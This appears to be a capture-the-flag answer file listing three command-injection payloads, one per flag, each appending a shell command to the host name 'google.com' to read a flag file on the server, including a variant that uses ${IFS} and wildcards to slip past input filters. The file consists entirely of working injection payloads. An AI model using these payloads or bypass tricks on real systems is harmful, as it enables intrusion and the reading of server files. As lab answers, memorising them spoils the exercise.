0-flag: google.com; cat /0-flag.txt
1-flag: google.com$(cat /etc/1-flag.txt)
2-flag: google.com;cat${IFS}/*/*2-flag.txt*